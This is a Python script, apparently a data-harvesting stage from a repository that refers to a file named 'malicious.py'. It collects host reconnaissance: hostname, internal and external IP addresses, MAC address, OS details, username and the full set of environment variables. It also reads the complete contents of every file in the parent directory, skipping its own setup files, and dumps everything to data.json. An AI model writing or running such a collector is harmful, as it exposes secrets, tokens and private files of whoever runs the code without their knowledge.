import os
import json
import platform
import socket
import uuid
import urllib.request

def get_ip_info():
    ip_info = {}
    hostname = socket.gethostname()
    ip_info['Hostname'] = hostname

    # Get the IP address associated with the hostname
    try:
        host_ip = socket.gethostbyname(hostname)
        ip_info['Host IP'] = host_ip
    except socket.gaierror:
        ip_info['Host IP'] = "Unable to get Host IP"

    # Get all IP addresses and network interfaces
    ip_info['All IPs'] = []
    for ip in socket.getaddrinfo(hostname, None):
        ip_address = ip[4][0] if ip[1] == socket.SOCK_STREAM else ip[4]
        if ip_address not in ip_info['All IPs']:
            ip_info['All IPs'].append(ip_address)

    return ip_info

def get_external_ip():
    try:
        external_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
        return external_ip
    except Exception as e:
        print(f"Could not retrieve external IP: {e}")
        return None

def get_mac_address():
    mac = uuid.UUID(int=uuid.uuid1().int & (1 << 48) - 1)
    return mac.hex[-12:]

def get_system_info():
    info = {
        "MAC_address": get_mac_address(),
        "OS": platform.system(),
        "OS_version": platform.version(),
        "Architecture": platform.architecture(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "CPU_count": os.cpu_count(),
        "User": os.getlogin(),
        "Current_working_directory": os.getcwd(),
        "Hostname": socket.gethostname(),
        "IP_info": get_ip_info(),
        "External IP": get_external_ip(),
        "Python_version": platform.python_version(),
        "Python_compiler": platform.python_compiler(),
        "Python_build": platform.python_build(),
        "Node": platform.node(),
        "Release": platform.release(),
        "Uname": platform.uname(),
        "System_Uptime": os.popen('uptime').read().strip(),
        "Load_Average": os.getloadavg(),
        "Environment_Variables": str(os.environ)
    }
    return info

def get_file_details(directory):
    file_info = {}
    ignored_files = {'FETCH_HEAD', 'index', '.gitignore', 'data.json', 'setup', 'setup.sh', 'malicious.py', 'README.md', 'LICENSE'}
    ignored_dirs = {'.git', 'setup'}
    for root, dirs, files in os.walk(directory):
        # Remove ignored directories from dirs list in-place
        dirs[:] = [d for d in dirs if d not in ignored_dirs]
        for file in files:
            if file not in ignored_files:
                file_path = os.path.join(root, file)
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                file_info[file] = {
                    "Size": os.path.getsize(file_path),
                    "Content": content
                }
    return file_info


def main():
    data = {
        "System Info": get_system_info(),
        "File Details": get_file_details(os.path.join(os.path.dirname(__file__), '..'))
    }

    with open('data.json', 'w') as f:
        json.dump(data, f, indent=4)

if __name__ == "__main__":
    main()
